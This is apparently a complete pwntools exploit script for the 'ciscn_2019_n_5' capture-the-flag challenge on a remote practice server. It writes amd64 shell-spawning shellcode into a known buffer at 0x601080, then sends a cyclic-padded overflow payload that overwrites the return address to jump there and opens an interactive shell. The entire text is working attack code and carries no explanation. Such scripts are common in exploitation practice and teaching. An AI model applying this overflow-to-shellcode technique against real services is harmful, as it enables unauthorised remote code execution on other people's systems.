from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

# io = process('./ciscn_2019_n_5')
io = remote('node4.buuoj.cn',28974)
elf = ELF('./ciscn_2019_n_5')

shellcode_addr = 0x601080

shellcode = asm(shellcraft.amd64.sh())
io.sendlineafter(b'tell me your name',shellcode)
payload = cyclic(0x20+8) + p64(shellcode_addr)
io.sendlineafter(b'What do you want to say to me?',payload)
io.interactive()